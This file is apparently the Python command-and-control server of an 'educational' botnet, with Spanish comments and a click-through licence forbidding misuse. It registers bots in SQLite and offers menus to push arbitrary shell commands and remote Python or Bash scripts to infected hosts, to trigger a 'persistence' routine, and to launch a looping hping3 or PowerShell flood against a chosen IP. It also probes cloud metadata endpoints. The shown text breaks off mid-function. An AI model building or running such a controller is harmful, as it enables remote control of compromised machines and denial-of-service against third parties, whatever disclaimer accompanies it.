import logging
import socket
import sys
import threading
import time
import os
import ipaddress
import requests
import sqlite3
import configparser
from datetime import datetime

bots = [] # List de bots
bot_ids = {} # Diccinario con los IDS de los bots
sistemas_operativos = {}  # Diccionario para almacenar el SO de cada bot
respuestas_bots = {}  # Diccionario para almacenar las últimas respuestas de los bots
ddos_status = {}  # Diccionario para almacenar el estado del DDoS en cada bot
server_running = True  # Variable para controlar el estado del servidor

def configurar_logging(config):
    """
    Configura el sistema de logging del servidor.

    El nivel de log se establece según la clave "LOG_LEVEL" en el objeto de configuración.
    El nivel de log puede ser "DEBUG", "INFO", "WARNING", "ERROR" o "CRITICAL".
    Si no se especifica un nivel de log, se establece en "INFO" por defecto.

    La ruta del archivo de log se establece según la clave "LOG_FILE" en el objeto de configuración.
    La ruta se crea si no existe.

    El formato de los mensajes de log se establece en "%(asctime)s - %(levelname)s - %(message)s".

    Los mensajes de log se escriben en el archivo de log y en la consola.

    :param config: Un objeto con la configuración del servidor.
    """
    try:
        log_level = config["LOG_LEVEL"].upper()
        log_file = config["SERVER_LOG_FILE"]

        log_levels = {
            "DEBUG": logging.DEBUG,
            "INFO": logging.INFO,
            "WARNING": logging.WARNING,
            "ERROR": logging.ERROR,
            "CRITICAL": logging.CRITICAL
        }
        log_level = log_levels.get(log_level, logging.INFO)

        os.makedirs(os.path.dirname(log_file), exist_ok=True)

        logging.basicConfig(
            level=log_level,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler(log_file, encoding="utf-8"),
                logging.StreamHandler(sys.stdout)
            ]
        )

        logging.info("Sistema de logging configurado correctamente.")
    except Exception as e:
        logging.error(f"Error al configurar el logging: {e}")

# Inicializar la base de datos
def actualizar_db_schema(DB_PATH):
    """
    Actualiza el esquema de la base de datos SQLite para agregar la columna 'categoria' a la tabla 'respuestas'.

    :param DB_PATH: La ruta del archivo de la base de datos.
    :type DB_PATH: str
    """
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        # Verificar si la columna 'categoria' ya existe
        cursor.execute("PRAGMA table_info(respuestas)")
        columns = [column[1] for column in cursor.fetchall()]
        if 'categoria' not in columns:
            cursor.execute("ALTER TABLE respuestas ADD COLUMN categoria TEXT DEFAULT 'general'")
            conn.commit()
            logging.info("Esquema de la base de datos actualizado correctamente.")
        conn.close()
    except Exception as e:
        logging.error(f"Error al actualizar el esquema de la base de datos: {e}")

def init_db(DB_PATH):
    """
    Inicializa la base de datos SQLite para almacenar información sobre los bots y sus respuestas.

    Crea la carpeta y el archivo de la base de datos si no existe,
    y crea las tablas "bots" y "respuestas" si no existen.

    :param DB_PATH: La ruta del archivo de la base de datos.
    :type DB_PATH: str
    """
    try:
        db_dir = os.path.dirname(DB_PATH)
        if not os.path.exists(db_dir):
            os.makedirs(db_dir)  # Crear carpeta si no existe

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()

        cursor.execute('''CREATE TABLE IF NOT EXISTS bots (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            identificador TEXT UNIQUE,
                            ip TEXT,
                            hostname TEXT,
                            os TEXT,
                            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                        )''')

        cursor.execute('''CREATE TABLE IF NOT EXISTS respuestas (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            bot_id INTEGER,
                            respuesta TEXT,
                            categoria TEXT,
                            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                            FOREIGN KEY (bot_id) REFERENCES bots (id)
                        )''')

        conn.commit()
        conn.close()
        logging.info("Base de datos inicializada correctamente.")
    except Exception as e:
        logging.error(f"Error al inicializar la base de datos: {e}")

def agregar_respuesta_en_db(config, bot_id, respuesta, categoria="general"):
    """
    Agrega una respuesta de un bot a la base de datos SQLite.

    :param config: Un objeto con la configuración del servidor.
    :param bot_id: El ID del bot que envió la respuesta.
    :type bot_id: int
    :param respuesta: La respuesta del bot.
    :type respuesta: str
    :param categoria: La categoría de la respuesta.
    :type categoria: str
    """
    try:
        logging.debug(f"Agregando respuesta en DB: bot_id={bot_id}, respuesta={respuesta}, categoria={categoria}")
        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO respuestas (bot_id, respuesta, categoria, timestamp) VALUES (?, ?, ?, ?)", (bot_id, respuesta, categoria, datetime.now()))
        conn.commit()
        conn.close()
        logging.info(f"Respuesta del bot {bot_id} agregada a la base de datos.")
    except sqlite3.Error as e:
        logging.error(f"Error al agregar la respuesta del bot en la base de datos: {e}")

def detectarEntornoCloud():
    
    """
    Detecta si el entorno actual es un entorno de cloud computing.

    Intenta conectarse a los puntos de metadata de AWS y Google Cloud para 
    determinar si el código se ejecuta en un entorno de nube. Si se logra 
    conectar exitosamente a cualquiera de estos servicios, se asume que el 
    entorno es un entorno de cloud y se devuelve True. En caso contrario, 
    se devuelve False.

    Returns:
        bool: True si se ejecuta en un entorno de cloud, False en caso contrario.
    """
    try:
        try:
            # AWS Metadata
            if requests.get("http://169.254.169.254/latest/meta-data/", timeout=1).status_code == 200:
                logging.info("Entorno de cloud computing detectado.")
                return True
        except requests.exceptions.RequestException:
            pass

        try:
            # Google Cloud Metadata
            if requests.get("http://metadata.google.internal/", timeout=1).status_code == 200:
                logging.info("Entorno de cloud computing detectado.")
                return True
        except requests.exceptions.RequestException:
            pass

        return False
    except Exception as e:
        logging.error(f"Error al detectar el entorno cloud: {e}")
        return False

def esRedPrivada(ip):
    """Indica si una IP es de una red privada o no.

    La función intenta crear un objeto ipaddress.ip_address() con la IP dada y devuelve
    el resultado de llamar a su método is_private(). Si la IP no es válida,
    devuelve False.

    Parameters:
    ip (str): La IP a verificar.

    Returns:
    bool: True si la IP es de una red privada, False si no lo es.
    """
    try:
        result = ipaddress.ip_address(ip).is_private
        logging.info(f"Verificación de red privada para la IP: {ip}")
        return result
    except ValueError as e:
        logging.error(f"Error al verificar si la IP es privada: {e}")
        return False

def verificar_eula(tipo):
    """
    Verifica si el usuario ha aceptado la licencia antes de ejecutar el programa.
    
    :param tipo: "servidor" o "cliente" para determinar qué EULA verificar.
    """
    try:
        if tipo not in ["servidor", "cliente"]:
            raise ValueError("Tipo de EULA no válido. Debe ser 'servidor' o 'cliente'.")

        # Ruta para el archivo EULA en la carpeta docs
        BASE_DIR = os.path.dirname(os.path.abspath(__file__))
        eula_path = os.path.join(BASE_DIR, "..", "docs", f"eula_{tipo}.txt")

        # Si no existe, lo crea
        if not os.path.exists(eula_path):
            with open(eula_path, "w") as f:
                f.write("ACCEPTED=False")

        # Leer si ya aceptó
        with open(eula_path, "r") as f:
            for linea in f:
                if "ACCEPTED=True" in linea:
                    logging.info(f"Verificación de EULA para el tipo: {tipo}")
                    return True

        # Mostrar Acuerdo de Licencia
        print("\n" + "="*50)
        print(f"📜  ACUERDO DE LICENCIA ({tipo.upper()}) 📜")
        print("="*50)
        print("\nEste software es exclusivamente para propósitos educativos y de investigación.")
        print("El uso en redes ajenas sin autorización está prohibido.")
        print("El usuario debe cumplir con las leyes de su país.")
        print("No se permite el uso de este software en redes públicas.")
        print("El autor no se hace responsable del uso indebido.\n")
        print("EL SOFTWARE NO FUNCIONARÁ FUERA DE UNA RED PRIVADA.\n")
        
        print("🔴  QUEDA TERMINANTEMENTE PROHIBIDO:")
        print("   - Usarlo con intenciones maliciosas.")
        print("   - Ejecutarlo en infraestructuras críticas sin permiso.")
        print("   - Modificarlo para evadir restricciones.")
        print("   - Distribuirlo con fines ilegales o comerciales.\n")
        
        print("💡  Al escribir 'ACEPTO', el usuario declara que asume toda la responsabilidad sobre su uso.\n")
        
        respuesta = input("Escriba 'ACEPTO' para continuar: ").strip().upper()
        
        if respuesta == "ACEPTO":
            with open(eula_path, "w") as f:
                f.write("ACCEPTED=True")
            logging.info(f"Verificación de EULA para el tipo: {tipo}")
            return True
        else:
            print("Debe aceptar la licencia para usar este software.")
            exit()
    except Exception as e:
        logging.error(f"Error al verificar el EULA: {e}")
        exit()

def adapt_datetime(dt):
    return dt.strftime("%Y-%m-%d %H:%M:%S")

def convert_datetime(s):
    return datetime.strptime(s.decode(), "%Y-%m-%d %H:%M:%S")

sqlite3.register_adapter(datetime, adapt_datetime)
sqlite3.register_converter("timestamp", convert_datetime)

def agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os):
    """
    Agrega un bot a la base de datos SQLite o actualiza su IP si ya existe.

    :param config: Un objeto con la configuración del servidor.
    :param identificador: El identificador único del bot.
    :type identificador: str
    :param ip: La dirección IP del bot.
    :type ip: str
    :param hostname: El nombre del host del bot.
    :type hostname: str
    :param os: El sistema operativo del bot.
    :type os: str
    """
    try:
        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cursor = conn.cursor()
        cursor.execute("SELECT id FROM bots WHERE identificador = ?", (identificador,))
        bot = cursor.fetchone()
        if bot:
            cursor.execute("UPDATE bots SET ip = ?, hostname = ?, os = ?, last_seen = ? WHERE identificador = ?", (ip, hostname, os, datetime.now(), identificador))
            logging.info(f"Bot actualizado en la base de datos: {identificador}, {ip}, {hostname}, {os}")
        else:
            cursor.execute("INSERT INTO bots (identificador, ip, hostname, os, last_seen) VALUES (?, ?, ?, ?, ?)", (identificador, ip, hostname, os, datetime.now()))
            logging.info(f"Bot agregado a la base de datos: {identificador}, {ip}, {hostname}, os")
        conn.commit()
        conn.close()
    except Exception as e:
        logging.error(f"Error al agregar o actualizar el bot en la base de datos: {e}")

def actualizar_bot_en_db(config, ip):
    """
    Actualiza la última vez visto de un bot en la base de datos SQLite.

    :param config: Un objeto con la configuración del servidor.
    :param ip: La dirección IP del bot.
    :type ip: str
    """
    try:
        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cursor = conn.cursor()
        cursor.execute("UPDATE bots SET last_seen = ? WHERE ip = ?", (datetime.now(), ip))
        conn.commit()
        conn.close()
        logging.info(f"Bot actualizado en la base de datos: {ip}")
    except Exception as e:
        logging.error(f"Error al actualizar el bot en la base de datos: {e}")

def obtener_categorias_disponibles(config, bot_id):
    """
    Obtiene las categorías disponibles de respuestas para un bot específico.

    :param config: Un objeto con la configuración del servidor.
    :param bot_id: El ID del bot cuyas categorías se desean obtener.
    :type bot_id: int
    :return: Una lista de categorías disponibles.
    :rtype: list
    """
    try:
        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cursor = conn.cursor()
        cursor.execute("SELECT DISTINCT categoria FROM respuestas WHERE bot_id = ?", (bot_id,))
        categorias = [row[0] for row in cursor.fetchall()]
        conn.close()
        return categorias
    except Exception as e:
        logging.error(f"Error al obtener las categorías del bot {bot_id}: {e}")
        return []

def obtener_respuestas_bot(config, bot_id, categoria=None):
    """
    Obtiene las respuestas de un bot específico desde la base de datos SQLite.

    :param config: Un objeto con la configuración del servidor.
    :param bot_id: El ID del bot cuyas respuestas se desean obtener.
    :type bot_id: int
    :param categoria: La categoría de respuesta a filtrar (opcional).
    :type categoria: str
    :return: Una lista de respuestas del bot.
    :rtype: list
    """
    try:
        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cursor = conn.cursor()
        if categoria:
            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ? AND categoria = ?", (bot_id, categoria))
        else:
            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ?", (bot_id,))
        respuestas = cursor.fetchall()
        conn.close()
        return respuestas
    except Exception as e:
        logging.error(f"Error al obtener las respuestas del bot {bot_id}: {e}")
        return []

def ver_respuestas_bot(config):
    """
    Muestra las respuestas de un bot específico y permite filtrar por categoría.

    :param config: Un objeto con la configuración del servidor.
    """
    try:
        listar_bots()
        bot_id = int(input("Ingrese el ID del bot cuyas respuestas desea ver: "))
        categorias = obtener_categorias_disponibles(config, bot_id)
        if categorias:
            print(f"Categorías disponibles: {', '.join(categorias)}")
        categoria = input("Ingrese la categoría de respuesta a filtrar (opcional): ").strip()

        respuestas = obtener_respuestas_bot(config, bot_id, categoria if categoria in categorias else None)
        if respuestas:
            print(f"\nRespuestas del bot {bot_id}:")
            for respuesta, timestamp in respuestas:
                print(f"[{timestamp}] {respuesta}")
        else:
            print(f"No se encontraron respuestas para el bot {bot_id} con la categoría '{categoria}'.")
    except ValueError:
        print("ID inválido. Debe ingresar un número.")
    except Exception as e:
        logging.error(f"Error al ver las respuestas del bot: {e}")

def manejar_bot(conn, addr, bot_id, config):
    """
    Maneja una conexión de bot y la agrega o actualiza en la base de datos.

    :param conn: El socket del bot conectado.
    :type conn: socket.socket
    :param addr: La dirección IP y puerto del bot.
    :type addr: tuple
    :param bot_id: El ID del bot, que se usará para identificarlo.
    :type bot_id: int
    :param config: Un objeto con la configuración del servidor.
    """
    try:
        ip, port = addr
        hostname = socket.gethostbyaddr(ip)[0]
        logging.info(f"Bot {bot_id} conectado desde {addr}")
        print(f"Bot {bot_id} conectado desde {addr}")

        # Recibir identificador único
        identificador = conn.recv(1024).decode("utf-8").strip()
        logging.info(f"Identificador único recibido: {identificador}")

        # Detectar sistema operativo
        try:
            conn.send("detect_os".encode("utf-8"))
            os_info = conn.recv(1024).decode("utf-8").strip().lower()
            os = "windows" if "windows" in os_info else "linux"
            sistemas_operativos[conn] = os
            print(f"Bot {bot_id} identificado como {os.capitalize()}")
        except Exception as e:
            print(f"Error al detectar OS de {addr}: {e}")
            os = "desconocido"

        agregar_o_actualizar_bot_en_db(config, identificador, ip, hostname, os)

        while True:
            try:
                data = conn.recv(4096).decode("utf-8", errors="ignore").strip()
                if not data:
                    continue

                # Guardar la respuesta en el diccionario sin imprimirla
                respuestas_bots[bot_id] = data
                logging.debug(f"Respuesta recibida de bot {bot_id}: {data}")
                actualizar_bot_en_db(config, ip)
                categoria = "general"
                if "systeminfo" in data or "uname" in data:
                    categoria = "informacion_sistema"
                elif "netstat" in data:
                    categoria = "conexiones_red"
                elif "tasklist" in data or "ps aux" in data:
                    categoria = "procesos"
                elif "dir" in data or "ls -lah" in data:
                    categoria = "archivos"
                elif "curl ifconfig.me" in data:
                    categoria = "ip_publica"
                elif "hping3" in data or "Test-NetConnection" in data:
                    categoria = "ddos"
                elif "persistencia" in data:
                    categoria = "persistencia"
                else:
                    categoria = "comando_personalizado"
                agregar_respuesta_en_db(config, bot_id, data, categoria)

            except socket.timeout:
                print(f"Tiempo de espera agotado con {addr}.")
            except Exception as e:
                print(f"Error con {addr}: {e}")
                break

        # Manejo de desconexión
        conn.close()
        logging.info(f"Bot {bot_id} desconectado")
        print(f"Bot {bot_id} desconectado")
    except Exception as e:
        logging.error(f"Error al manejar el bot {bot_id}: {e}")
    finally:
        conn.close()
        logging.info(f"Bot {bot_id} desconectado")
        print(f"Bot {bot_id} desconectado")

def aceptar_conexiones(server, config):
    global server_running
    """
    Acepta conexiones de bots y las asigna a un hilo para manejarlas.

    Este hilo infinito espera conexiones de bots y las asigna a la lista de
    bots conectados. A cada bot se le asigna un ID único y se crea un hilo
    para manejar la conexión. El hilo maneja_bot se encarga de recibir los
    mensajes del bot, detectar el sistema operativo y ejecutar comandos
    enviados por el usuario.

    :param server: El socket del servidor C&C.
    :type server: socket.socket
    :param config: Un objeto con la configuración del servidor.
    """
    try:
        logging.info("Aceptando conexiones de bots")
        bot_id = 1 # Contador de bots
        while server_running:
            try:
                conn, addr = server.accept() # Aceptar la conexión
                bots.append(conn) # Agregar el bot a la lista
                bot_ids[conn] = bot_id # Asignar el ID del bot
                threading.Thread(target=manejar_bot, args=(conn, addr, bot_id, config)).start() # Crear un hilo para manejar la conexión
                bot_id += 1 # Incrementar el contador de bots
            except OSError:
                if not server_running:
                    break
                else:
                    raise
    except Exception as e:
        logging.error(f"Error al aceptar conexiones: {e}")

def obtener_respuestas_bot(config, bot_id, tipo=None):
    """
    Obtiene las respuestas de un bot específico desde la base de datos SQLite.

    :param config: Un objeto con la configuración del servidor.
    :param bot_id: El ID del bot cuyas respuestas se desean obtener.
    :type bot_id: int
    :param tipo: El tipo de respuesta a filtrar (opcional).
    :type tipo: str
    :return: Una lista de respuestas del bot.
    :rtype: list
    """
    try:
        conn = sqlite3.connect(config["DB_PATH"], detect_types=sqlite3.PARSE_DECLTYPES | sqlite3.PARSE_COLNAMES)
        cursor = conn.cursor()
        if tipo:
            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ? AND respuesta LIKE ?", (bot_id, f"%{tipo}%"))
        else:
            cursor.execute("SELECT respuesta, timestamp FROM respuestas WHERE bot_id = ?", (bot_id,))
        respuestas = cursor.fetchall()
        conn.close()
        return respuestas
    except Exception as e:
        logging.error(f"Error al obtener las respuestas del bot {bot_id}: {e}")
        return []

def ver_respuestas_bot(config):
    """
    Muestra las respuestas de un bot específico y permite filtrar por categoría.

    :param config: Un objeto con la configuración del servidor.
    """
    try:
        listar_bots()
        bot_id = int(input("Ingrese el ID del bot cuyas respuestas desea ver: "))
        categorias = obtener_categorias_disponibles(config, bot_id)
        if categorias:
            print(f"Categorías disponibles: {', '.join(categorias)}")
        categoria = input("Ingrese la categoría de respuesta a filtrar (opcional): ").strip()

        respuestas = obtener_respuestas_bot(config, bot_id, categoria if categoria in categorias else None)
        if respuestas:
            print(f"\nRespuestas del bot {bot_id}:")
            for respuesta, timestamp in respuestas:
                print(f"[{timestamp}] {respuesta}")
        else:
            print(f"No se encontraron respuestas para el bot {bot_id} con la categoría '{categoria}'.")
    except ValueError:
        print("ID inválido. Debe ingresar un número.")
    except Exception as e:
        logging.error(f"Error al ver las respuestas del bot: {e}")

def servidor_CnC(HOST, PORT, config):
    global server_running
    """
    Inicia el servidor de Comando y Control (CnC). Crea un socket, lo asocia
    a la IP y el puerto especificados y lo pone en escucha. Luego, crea un hilo
    para aceptar conexiones y entra en un bucle para mostrar un menú principal
    que permite al usuario interactuar con los bots conectados.

    :param HOST: La dirección IP del servidor.
    :type HOST: str
    :param PORT: El puerto de escucha del servidor.
    :type PORT: int
    :param config: Un objeto con la configuración del servidor.
    :return: None
    """
    try:
        logging.info(f"Iniciando servidor CnC en {HOST}:{PORT}")
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Crear el socket
        server.bind((HOST, PORT)) # Asociar el socket a la IP y el puerto
        server.listen(5) # Escuchar conexiones
        print(f"Escuchando en {HOST}:{PORT}...") # Imprimir que el servidor esta escuchando
        
        threading.Thread(target=aceptar_conexiones, args=(server, config)).start() # Crear un hilo para aceptar conexiones

        while server_running:
            print("\nMenú Principal:")
            print("1. Listar bots conectados")
            print("2. Enviar comandos")
            print("3. Cerrar conexión con un bot")
            print("4. Ver respuestas de un bot")
            print("5. Salir")
            opcion = input("Seleccione una opción: ")

            if opcion == "1":
                listar_bots()
            elif opcion == "2":
                menu_comandos()
            elif opcion == "3":
                cerrar_conexion_bots()
            elif opcion == "4":
                ver_respuestas_bot(config)
            elif opcion == "5":
                logging.info("Servidor CnC detenido")
                print("Saliendo de la consola...")
                server_running = False
                server.close()
                break
            else:
                print("Opción no válida. Intente de nuevo.")
        
        # Esperar a que todos los hilos de bots terminen
        for bot in bots:
            bot.close()
        for thread in threading.enumerate():
            if thread is not threading.current_thread():
                thread.join()
    except Exception as e:
        logging.error(f"Error en el servidor CnC: {e}")

def listar_bots():
    """
    Muestra la lista de bots conectados al servidor C&C, incluyendo
    su identificador, sistema operativo y dirección IP y puerto de
    conexión.
    
    :return: None
    """
    try:
        logging.info("Listando bots conectados")
        if bots:
            print("\nBots conectados:")
            for bot in bots: # Recorrer la lista de bots
                so = sistemas_operativos.get(bot, "Desconocido") # Obtener el SO del bot
                print(f"Bot {bot_ids[bot]} ({so.capitalize()}): {bot.getpeername()}") # Imprimir el bot
        else:
            print("No hay bots conectados.")
    except Exception as e:
        logging.error(f"Error al listar bots: {e}")

def menu_comandos():
    
    """
    Muestra el menú de comandos disponibles para ejecutar en los bots
    conectados y permite al usuario seleccionar una orden para ejecutar en
    todos los bots o en algunos seleccionados manualmente.

    :return: None
    """
    try:
        logging.info("Mostrando menú de comandos")
        if not bots:
            print("No hay bots conectados.")
            return

        print("\nSeleccione el tipo de comandos:")
        print("1. Comandos básicos")
        print("2. Comandos avanzados")
        tipo_comando = input("Ingrese su opción: ")

        if tipo_comando == "1":
            print("\nComandos básicos disponibles:")
            print("1. Obtener información del sistema")
            print("2. Consultar conexiones de red")
            print("3. Ver procesos en ejecución")
            print("4. Listar archivos en el directorio actual")
            print("5. Obtener la IP pública")
            orden = input("Seleccione una orden: ")
            comando_windows = ""
            comando_linux = ""

            if orden == "1":
                comando_windows = "systeminfo"
                comando_linux = "uname -a && lsb_release -a"
            elif orden == "2":
                comando_windows = "netstat -ano"
                comando_linux = "netstat -tunapl"
            elif orden == "3":
                comando_windows = "tasklist"
                comando_linux = "ps aux"
            elif orden == "4":
                comando_windows = "dir"
                comando_linux = "ls -lah"
            elif orden == "5":
                comando_windows = "curl ifconfig.me"
                comando_linux = "curl ifconfig.me"
            else:
                print("Opción no válida.")
                return

            enviar_comando(comando_windows, comando_linux)

        elif tipo_comando == "2":
            print("\nComandos avanzados disponibles:")
            print("1. Simular ataque DDoS")
            print("2. Detener simulación de DDoS")
            print("3. Ejecutar un comando personalizado")
            print("4. Ejecutar un script remoto")
            print("5. Intentar asegurar la persistencia")
            orden = input("Seleccione una orden: ")
            comando_windows = ""
            comando_linux = ""

            if orden == "1":
                objetivo = input("Ingrese la dirección IP del objetivo: ")
                puerto = input("Ingrese el puerto del objetivo: ")
                protocolo = input("Ingrese el protocolo (TCP/UDP): ").upper()
                if protocolo not in ["TCP", "UDP"]:
                    print("Protocolo no válido.")
                    return
                comando_windows = f"powershell -Command \"for ($i=0; $i -lt 10; $i++) {{Start-Sleep -Seconds 10; Test-NetConnection -ComputerName {objetivo} -Port {puerto} -InformationLevel 'Detailed'}}\""
                comando_linux = f"for i in {{1..10}}; do hping3 -S -p {puerto} -c 1 {objetivo}; sleep 10; done"
                enviar_comando(comando_windows, comando_linux, "ddos_start")
            elif orden == "2":
                comando_windows = "stop_ddos"
                comando_linux = "stop_ddos"
                enviar_comando(comando_windows, comando_linux, "ddos_stop")
            elif orden == "3":
                comando_windows = input("Ingrese el comando personalizado para Windows: ")
                comando_linux = input("Ingrese el comando personalizado para Linux: ")
                enviar_comando(comando_windows, comando_linux)
            elif orden == "4":
                print("Seleccione el tipo de script:")
                print("1. Python")
                print("2. Bash")
                print("3. Otro (especificar)")
                
                tipo = input("Ingrese la opción: ")

                if tipo == "1":
                    extension = "py"
                    interprete_linux = "python3 -c"
                    interprete_windows = "python -c"
                elif tipo == "2":
                    extension = "sh"
                    interprete_linux = "bash -c"
                    interprete_windows = "powershell -Command"
                elif tipo == "3":
                    extension = input("Ingrese la extensión del script (ejemplo: ps1, rb, pl): ")
                    interprete_linux = input("Ingrese el comando para ejecutarlo en Linux: ")
                    interprete_windows = input("Ingrese el comando para ejecutarlo en Windows: ")
                else:
                    print("Opción inválida.")
                    return

                print("\n¿Cómo desea proporcionar el script?")
                print("1. Escribirlo aquí")
                print("2. Proporcionar la ruta de un archivo")
                
                metodo = input("Ingrese la opción: ")

                if metodo == "1":
                    print(f"Escriba su script en {extension}. Finalice con 'EOF' en una línea nueva:")
                    lineas = []
                    while True:
                        try:
                            linea = input()
                            if linea.strip().upper() == "EOF":  # Detectar EOF
                                break
                            lineas.append(linea)
                        except KeyboardInterrupt:  # Capturar Ctrl+C para salir
                            print("\nEntrada cancelada.")
                            return
                    script = "\n".join(lineas)  # Unir líneas en una sola cadena
                elif metodo == "2":
                    ruta = input("Ingrese la ruta del archivo: ")
                    try:
                        with open(ruta, "r", encoding="utf-8") as archivo:
                            script = archivo.read()
                    except Exception as e:
                        print(f"Error al leer el archivo: {e}")
                        return
                else:
                    print("Opción inválida.")
                    return

                # Reemplazar comillas para evitar problemas con la ejecución remota
                script = script.replace('"', r'\"').replace("'", r"\'")

                comando_windows = f'{interprete_windows} "{script}"'
                comando_linux = f"{interprete_linux} '{script}'"

                enviar_comando(comando_windows, comando_linux)
            elif orden == "5":
                print("\nIntentando asegurar la persistencia en los bots seleccionados...")
                comando_windows = "persistencia"
                comando_linux = "persistencia"
                enviar_comando(comando_windows, comando_linux)
            else:
                print("Opción no válida.")
                return
        else:
            print("Opción no válida.")
            return
    except Exception as e:
        logging.error(f"Error en el menú de comandos: {e}")

def enviar_comando(comando_windows, comando_linux, tipo_comando=None):
    
    """
    Envía un comando a un conjunto de bots seleccionados.

    :param comando_windows: El comando a enviar a los bots Windows.
    :type comando_windows: str
    :param comando_linux: El comando a enviar a los bots Linux.
    :type comando_linux: str
    :param tipo_comando: El tipo de comando a enviar (opcional).
    :type tipo_comando: str
    """
    try:
        logging.info("Enviando comando a los bots seleccionados")
        if not bots:
            print("No hay bots conectados.")
            return

        print("\nSeleccione a qué bots enviar el comando:")
        print("1. Todos los bots")
        print("2. Solo bots Windows")
        print("3. Solo bots Linux")
        print("4. Un bot específico")
        print("5. Lista de bots específicos")

        seleccion = input("Ingrese su opción: ")
        bots_seleccionados = []

        if seleccion == "1":
            bots_seleccionados = bots
        elif seleccion == "2":
            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "windows"]
        elif seleccion == "3":
            bots_seleccionados = [bot for bot in bots if sistemas_operativos.get(bot) == "linux"]
        elif seleccion == "4":
            listar_bots()
            try:
                bot_id = int(input("Ingrese el ID del bot: "))
                bot = next((b for b in bots if bot_ids.get(b) == bot_id), None)
                if bot:
                    bots_seleccionados.append(bot)
                else:
                    print("ID de bot no válido.")
                    return
            except ValueError:
                print("ID inválido. Debe ingresar un número.")
                return
        elif seleccion == "5":
            listar_bots()
            try:
                bot_ids_seleccionados = [int(id.strip()) for id in input("Ingrese los IDs de los bots separados por comas: ").split(",") if id.strip().isdigit()]
                bots_seleccionados = [b for b in bots if bot_ids.get(b) in bot_ids_seleccionados]
                if not bots_seleccionados:
                    print("No se encontraron bots con los IDs proporcionados.")
                    return
            except ValueError:
                print("Entrada inválida. Debe ingresar números separados por comas.")
                return
        else:
            print("Opción no válida.")
            return

        respuestas = {}

        for bot in bots_seleccionados:
            respuestas[bot] = enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando)

        print("\n--- Respuestas de los bots ---\n")
        for bot, respuesta in respuestas.items():
            bot_info = f"Bot {bot_ids.get(bot, 'Desconocido')} ({sistemas_operativos.get(bot, 'Desconocido').capitalize()})"
            print(f"[→] {bot_info}: {respuesta}")

        print("\n--- Volviendo al menú principal ---\n")
        time.sleep(2)
    except Exception as e:
        logging.error(f"Error al enviar comando: {e}")

def enviar_comando_a_bot(bot, comando_windows, comando_linux, tipo_comando=None):
    
    """
    Envía un comando a un bot específico basado en su sistema operativo.

    Determina el sistema operativo del bot y envía el comando adecuado 
    para Windows o Linux. Espera una respuesta del bot por un tiempo 
    máximo definido y devuelve la respuesta si se recibe. Maneja la 
    desconexión del bot si ocurre durante la comunicación.

    :param bot: El socket del bot al que se enviará el comando.
    :param comando_windows: El comando a ejecutar si el bot es Windows.
    :param comando_linux: El comando a ejecutar si el bot es Linux.
    :param tipo_comando: El tipo de comando a enviar (opcional).
    :type tipo_comando: str
    :return: La respuesta del bot o un mensaje de error si no se recibe 
             respuesta o si el bot se desconecta.
    """
    try:
        logging.info(f"Enviando comando al bot {bot_ids.get(bot, 'Desconocido')}")
        so = sistemas_operativos.get(bot, "desconocido")
        comando = comando_windows if so == "windows" else comando_linux
        bot_id = bot_ids.get(bot, "Desconocido")

        try:
            bot.send(comando.encode('utf-8'))
            print(f"\n[✓] Orden enviada a bot {bot_id} ({so.capitalize()})\n")

            # Esperar hasta que `manejar_bot()` almacene la respuesta
            tiempo_maximo = 5  # Segundos
            tiempo_inicial = time.time()

            while time.time() - tiempo_inicial < tiempo_maximo:
                if bot_id in respuestas_bots:
                    respuesta = respuestas_bots.pop(bot_id)  # Tomar y eliminar la respuesta
                    if tipo_comando == "ddos_start":
                        ddos_status[bot_id] = "running"
                    elif tipo_comando == "ddos_stop":
                        ddos_status[bot_id] = "stopped"
                    print(f"\n--- Respuesta del Bot {bot_id} ---\n{respuesta}\n")
                    return respuesta if respuesta else "[INFO] Comando ejecutado sin salida"
                time.sleep(0.5)  # Esperar 0.5 segundos antes de verificar nuevamente

            return "[ERROR] No hubo respuesta del bot (Timeout)"

        except (socket.error, BrokenPipeError):
            print(f"[✗] Bot {bot_id} desconectado.")
            if bot in bots:
                bots.remove(bot)
            if bot in bot_ids:
                del bot_ids[bot]
            if bot in sistemas_operativos:
                del sistemas_operativos[bot]
            return "[ERROR] El bot se ha desconectado."
    except Exception as e:
        logging.error(f"Error al enviar comando al bot {bot_ids.get(bot, 'Desconocido')}: {e}")

def cerrar_conexion_bots():
    
    """
    Cierra la conexión con un bot seleccionado por el usuario.
    
    El usuario puede seleccionar a los bots a los que quiere cerrar la conexión
    mediante un ID o bien escribir "todos" para cerrar la conexión con todos
    los bots conectados.
    
    :return: None
    """
    try:
        logging.info("Cerrando conexión con los bots seleccionados")
        if not bots:
            print("No hay bots conectados.")
            return

        listar_bots()
        
        try:
            bot_id = int(input("Seleccione el ID del bot cuya conexión quiere cerrar: ")) # Obtener el ID del bot seleccionado
        except ValueError:
            print("ID inválido. Debe ingresar un número.")
            return

        bot = next((b for b in bots if bot_ids.get(b) == bot_id), None) # Buscar el bot con el ID correspondiente
        
        if not bot: # Si no se encuentra el bot
